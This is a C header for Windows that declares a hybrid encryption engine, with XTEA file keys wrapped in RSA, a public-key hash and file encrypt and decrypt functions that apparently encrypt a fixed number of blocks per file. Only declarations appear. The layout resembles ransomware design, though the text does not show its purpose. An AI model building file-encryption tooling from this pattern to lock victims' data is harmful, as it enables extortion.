#ifndef CRYPT_H
#define CRYPT_H

#include <windows.h>
#include <strsafe.h>
#include <stdint.h>
#include "biglib.h"
#include "sha.h"

#define RSA_BLOCK_SIZE			74/*147*/
#define XTEA_GENERATE_LETTERS	58
#define XTEA_KEY_SIZE			16
#define XTEA_BLOCK_SIZE			8
#define BLOCKS_TO_ENCRYPT		8

typedef struct CryptEngine
{
	struct XTEA
	{
		DWORD XTEA_KEY_RANGE;
		BYTE XTEA_KEY[XTEA_KEY_SIZE];
		BYTE RSAEncryptedKey[RSA_BLOCK_SIZE];
	} XTEA;
	struct RSA
	{
		BIG pModulus;
		BIG pEncryptionKey;
		BIG pDecryptionKey;
		BYTE SHA1PublicKeyHash[SHA1_HASH_LEN];
	} RSA;
} CryptEngine;

/* Initialization and deinitialization functions */
void InitCryptEngine(CryptEngine *ptr);
void FreeCryptEngine(CryptEngine *ptr);

/* RSA encryption functions */
void RSAEncrypt(CryptEngine *engine, BYTE *src, DWORD len, BYTE *dst);
void RSADecrypt(CryptEngine *engine, BYTE *src, DWORD len, BYTE *dst);

/* XTEA encryption functions */
void XTEAEncrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]);
void XTEADecrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]);

/* Functions for file encryption */
void FileEncrypt(char *filename, CryptEngine *engine);
void FileDecrypt(char *filename, CryptEngine *engine);

#endif
